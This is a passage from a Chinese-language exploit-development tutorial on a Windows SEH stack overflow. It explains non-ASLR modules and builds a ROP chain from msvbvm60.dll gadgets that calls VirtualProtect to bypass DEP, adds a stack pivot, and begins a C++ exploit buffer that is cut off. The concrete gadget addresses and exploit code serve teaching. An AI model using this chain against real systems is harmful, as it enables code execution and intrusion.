Address字段中进行配置。</li><li>当使用该标志编译PE文件时，它（在默认情况下）总是导致创建一个IMAGE_DIRECTORY_ENTRY_BASERELOC数据目录（存储在PE文件的.reloc段中）。如果没有这些重定位信息，Windows就无法重建模块的基地址并执行ASLR。</li><li>编译后的PE将在其IMAGE_OPTIONAL_HEADER.DllCharacteristics头部中设置IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志。</li><li>当PE被加载时，将为其选择一个随机的基地址，并且其代码&#x2F;数据中的所有绝对地址都将使用重定位部分进行重定位。这个随机地址在每次启动时都是不同的。</li><li>如果用于启动进程的主PE(EXE)启用了ASLR，也会导致栈和堆被随机化。</li></ol><p>您可能会注意到，这实际上会导致两种不同的情况，其中可能会出现非ASLR模块。第一种情况是显式编译模块以排除ASLR标志(或在该标志存在之前编译)，第二种情况是设置了ASLR标志，但由于缺少重新定位而无法应用。</p><p>开发人员的一个常见错误是，在他们的编译器中联合使用ASLR标志和“strip relocations”选项，他们认为这样生成的二进制文件是受ASLR保护的，而实际上它仍然是易受攻击的。从历史上看，非ASLR模块非常常见，甚至在Windows7+ Web浏览器攻击中被滥用，并在商业恶意软件中大获成功。现在，这类模块已经逐渐变得稀缺，这在很大程度上是因为ASLR已经成为诸如Visual Studio之类的IDE中默认启用的一种安全缓解措施。令人惊讶的是，我的扫描软件在我的Windows10虚拟机上发现了大量非ASLR模块，许多位于在System32和SysWOW64目录中。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture19.png" alt="img"></p><p>值得注意的是，图12中显示的所有非ASLR模块都具有非常不同（且唯一）的基地址。这些都是Microsoft编译的PE文件，其本意就是不使用ASLR，之所以这么做，很可能是出于性能或兼容性的原因。它们将始终加载到image_optional_header.imageBase中指定的映像基地址处（上图中突出显示的值）。显然，这些独特的映像基地址是编译器在创建时随机选择的。通常情况下，PE文件都会在其PE头部中包含默认映像基地址值，如0x00400000（用于EXE）和0x1000000（用于DLL）。这种专门创建的非ASLR模块与因失误而创建的非ASLR模块（如下图所示）形成了鲜明的对比。</p><p><img src="/.io//Picture20-1707050428583.png" alt="img"></p><p>这是在最新版本的HXD Hex Editor中作为重定位剥离(不知情的开发人员的旧优化习惯)副作用而创建的非ASLR模块的一个主要例子。值得注意的是，您可以在上面的图13中看到，与图12中的模块(具有随机基地址)不同，这些模块都具有相同的默认映像基地址0x00400000（已经被编译到它们的PE头部中）。这与其PE头部中存在的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志相结合，表明编译它们的开发人员假设它们将使用随机地址进行加载，而不是在0x00400000处进行加载，并认为它们会受到ASLR机制的保护。然而，在实践中，我们可以肯定它们总是被加载到地址0x00400000处，尽管已经启用了ASLR——因为在没有重新定位数据的情况下，操作系统是无法在初始化期间重新设置它们的基地址的。</p><p>通过回收非ASLR模块的可执行段(通常是它们的.text段)中的代码，我们能够构造相应的ROP链来调用KERNEL32.DLL!VirtualProtect API，并为栈上shellcode禁用DEP保护机制。</p><p>在图12中可以看出，我选择了SysWOW64中的非ASLR模块msvbvm60.dll作为ROP链，因为它不仅缺少ASLR保护，而且还缺少SafeSEH(考虑到我们必须知道在溢出时写入栈的伪造SEH handler&#x2F;stack pivot gadget的地址，这是一个至关重要的细节)。此外，这里还通过IAT导入了KERNEL32.DLL!VirtualProtect，这一细节极大地简化了ROP链的创建过程。</p><h2 id="创建ROP链"><a href="#创建ROP链" class="headerlink" title="创建ROP链"></a>创建ROP链</h2><p>第一步，我使用Ropper从msvbvm60.dll中提取所有可能有用的可执行代码片段（以RET、JMP或CALL指令结束）。实际上，我创建ROP链有三个主要意图：</p><ol><li>通过从msvbvm60.dll的IAT加载其地址来调用KERNEL32.DLL!VirtualProtect（以绕过KERNEL32.DLL的ASLR）。</li><li>动态控制VirtualProtect的第一个参数，使其指向栈上的shellcode（以绕过DEP）。</li><li>人为控制VirtualProtect的返回地址，令其返回时，动态地执行栈上的shellcode（现在的权限是+RWX）。</li></ol><p>在编写ROP链的时候，我先用汇编语言描述所需逻辑的伪代码，然后，设法用ROP Gadget来复现该逻辑。</p><p>下为ROP链的伪代码逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1 | MOV REG1, &lt;Address of VirtualProtect IAT thunk&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #2 | MOV REG2, &lt;Address of JMP ESP - Gadget #6&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #3 | MOV REG3, &lt;Address of gadget #5&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #4 | PUSH ESP ; PUSH REG3 ; RET</span><br><span class="line"></span><br><span class="line">Gadget #5 | PUSH REG2 ; JMP DWORD [REG1]</span><br><span class="line"></span><br><span class="line">Gadget #6 | JMP ESP</span><br></pre></td></tr></table></figure><p>值得注意的是，在上面精心构造的的逻辑中，使用了msvbvm60.dll中一个包含VirtualProtect地址的解除引用的IAT thunk地址，以解决KERNEL32.DLL的ASLR问题。Windows在加载msvbvm60.dll时，会为我们解析VirtualProtect的地址，并且这个地址将始终保存在msvbvm60.dll内的同一位置处。这里，我打算使用JMP指令来调用它，而不是CALL指令。这是因为我需要为调用VirtualProtect创建一个伪造的返回地址，这个返回地址将导致shellcode（现在已经摆脱了DEP）直接执行。这个伪造的返回地址会指向一个JMP ESP gadget。我这么做的理由是：尽管不知道（也无法知道）通过溢出写入栈中的shellcode的具体位置，但该gadget返回后，ESP会指向ROP链的末端，而我可以精心构造溢出内容，使shellcode正好位于这个ROP链后面。</p><p>此外，我在第4个gadget中也使用了同样的技术：通过两个push指令让ESP动态生成VirtualProtect的第一个参数。与JMP ESP指令不同（其中ESP会直接指向我的shellcode），这里的ESP会与我的shellcode的地址略有偏差（运行时ESP与ROP链末端的距离）。这并不是一个问题，因为充其量只是在ROP链的末端除了shellcode本身之外，还将禁用DEP。</p><p>在构建ROP链的过程中（也就是将上述逻辑付诸实施过程中），我发现gadget #4（我的伪代码gadget中最稀有和最不可替代的一个）没有出现在msvbvm60.dll中。这个挫折是一个很好的例子，说明了为什么在任何公共漏洞利用代码中几乎每个ROP链都在使用PUSHAD指令，而不是类似于我所描述的伪代码逻辑。</p><p>简而言之，PUSHAD指令允许exploit编写者动态地将ESP的值（以及栈上的shellcode）与所有其他相关的KERNEL32.DLL!VirtualProtect参数一起放到栈上，而无需使用任何罕见的gadget。他们所有需要做的就是正确填充每个通用寄存器的值，然后执行PUSHAD ; RET gadget来完成攻击。关于这方面的详细介绍，请访问Corelan撰写的“ Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube”一文。最终，我们的ROP链需要通过如下方式设置相关的寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">EAX = NOP sled</span><br><span class="line"></span><br><span class="line">ECX = Old protection (writable address)</span><br><span class="line"></span><br><span class="line">EDX = PAGE_EXECUTE_READWRITE</span><br><span class="line"></span><br><span class="line">EBX = Size</span><br><span class="line"></span><br><span class="line">EBP = VirtualProtect return address (JMP ESP)</span><br><span class="line"></span><br><span class="line">ESI = KERNEL32.DLL!VirtualProtect</span><br><span class="line"></span><br><span class="line">EDI = ROPNOP</span><br></pre></td></tr></table></figure><p>在实践中，上面的逻辑可以被ROP gadget替换，具体如下面的伪码所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1: MOV EAX, &lt;msvbvm60.dll!VirtualProtect&gt;</span><br><span class="line"></span><br><span class="line">Gadget #2: MOV ESI, DWORD [ESI]</span><br><span class="line"></span><br><span class="line">Gadget #3: MOV EAX, 0x90909090</span><br><span class="line"></span><br><span class="line">Gadget #4: MOV ECX, &lt;msvbvm60.dll!.data&gt;</span><br><span class="line"></span><br><span class="line">Gadget #5: MOV EDX, 0x40</span><br><span class="line"></span><br><span class="line">Gadget #6: MOV EBX, 0x2000</span><br><span class="line"></span><br><span class="line">Gadget #7: MOV EBP,</span><br><span class="line"></span><br><span class="line">Gadget #8: MOV EDI,</span><br><span class="line"></span><br><span class="line">Gadget #9: PUSHAD</span><br><span class="line"></span><br><span class="line">Gadget #10: ROPNOP</span><br><span class="line"></span><br><span class="line">Gadget #11: JMP ESP</span><br></pre></td></tr></table></figure><p>上面的伪码逻辑最终可以转换为来自msvbvm60.dll的ROP链数据，具体如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> RopChain[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br></pre></td></tr></table></figure><h2 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h2><p>构建了ROP链，也搞定了劫持EIP的方法，现在剩下的唯一任务就是构建exploit。为此，我们必须了解当伪造的SEH handler收到程序的控制权时栈的布局情况。理想情况下，我们当然希望ESP直接指向ROP链的顶部，并结合EIP重定向，使其指向链中的第一个gadget。在实践中，这是不可能的。让我们回顾一下栈喷射代码，并在在伪造的handler的开始处设置一个断点，以观察发生溢出和EIP劫持后栈的状态。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture23.png" alt="img"></p><p>在右边的突出显示的区域，我们可以看到栈的底部位于0x010FF3C0处。然而，您可能会注意到，栈中的值都不是我们溢出的内容——大家可能还记得，在发生访问冲突之前，我们在不断向栈中喷射伪造的SEH handler的地址。在左边突出显示的区域，我们可以看到，我们的溢出内容起始于0x010FFA0C附近。因此，在异常发生后，NTDLL.DLL让ESP向我们用溢出内容覆盖的栈区域下方偏移了0x64C字节（记住，栈是向下生长的，而不是向上生长的）。有了这些信息，就不难理解发生了什么。当NTDLL.DLL处理异常时，它开始使用异常发生时ESP下方的栈区域，而这个区域是我们鞭长莫及的，因此，也就无法写入我们的ROP链。</p><p>因此，这就产生了一个有趣的问题。也就是说，要想执行ROP链，我们需要让伪造的SEH handler设法让ESP（栈顶指针）重新指向由溢出内容覆盖的栈区域。当我们的断点被击中时，检查ESP的值，我们可以在0x010FF3C0处看到一个返回NTDLL.DLL的地址（无用），其后是另一个位于我们所能控制的栈范围（0x010FF4C4）下方的地址（也无用），它位于0x010FF3C4处。然而，0x010FF3C8处的第三个值0x010FF3A74直接落在从0x010FFA0C开始的受控区域的地址范围内，其偏移值为0x64。重新审视异常处理程序的原型，就会发现这第三个值（代表传递给处理程序的第二个参数）对应的是Windows传递给SEH handler的“已建帧”的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">SehHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span></span></span><br></pre></td></tr></table></figure><p>在我们的调试器中，检查栈中0x010FF3A74这个地址处的内容，我们可以更进一步地了解这个参数（也称为NSEH）的指向。</p><p><img src="/.io//Picture24-1707050428583.png" alt="img"></p><p>果然，我们可以看到，这个地址指向我们的溢出所控制的栈的一个区域（现在该区域已经被喷入的handler地址填满了）。具体来说，它直接指向前面提到的EXCEPTION_REGISTRATION_RECORD结构体的开始位置，而我们早就覆盖了这个结构体并用它来劫持EIP。在理想情况下，我们伪造的SEH handler会将ESP设置为[ESP + 8]，并且我们会将ROP链的开头部分放在被我们的溢出内容覆盖的EXCEPTION_REGISTRATION_RECORD结构体的开始处。对于这种类型的栈pivot，一个理想的gadget是POP REG;POP REG;POP ESP;RET或这种逻辑的一些变体，然而，msvbvm60.dll中并没有这种gadget，我不得不设法设计一个不同的解决方案。如前所述，当NTDLL将EIP重定向到我们伪造的SEH handler时，ESP在栈上的偏移量0x64C已经超出了我们用溢出控制的区域（具体来说，跑到该区域的下方了）。因此，对于栈pivot的这个问题，一个不太优雅的解决方案就是直接给ESP加上一个大于或等于0x64C的值。Ropper提供了一个功能，可以提取潜在的栈pivot gadget：</p><p><img src="/.io//Picture25-1707050428583.png" alt="img"></p><p>ADD ESP，0x1004 ; RET是一个略显混乱的gadget：它超出溢出开始处0x990个字节，但由于它是唯一一个值大于0x64C的ADD ESP，因此别无选择。这个栈pivot会让ESP从我们的溢出起始处超出0x990或0x98C个字节（当然，对于同一应用程序的不同实例以及Windows的不同版本来说，该值还能会有所变化）。这意味着我们需要在实际ROP链开始之前，用0x98C个垃圾字节和ROPNOP来填充溢出。</p><p><img src="/.io//Picture26-1707050428583.png" alt="img"></p><p>将这些知识整合到一段代码中：</p><p>(为了避免引发本机反应，以下代码需要在虚拟机中运行)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> Exploit[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16 bytes for buffer length</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Stack Cookie</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// EBP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Return address</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #1 | pInputBuf</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #2 | dwInputBufSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span> <span class="comment">// EXECEPTION_REGISTRATION_RECORD.Next</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf3\x28\x0f\x66&quot;</span><span class="comment">// EXECEPTION_REGISTRATION_RECORD.Handler | 0x660f28f3 | ADD ESP, 0x1004; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span 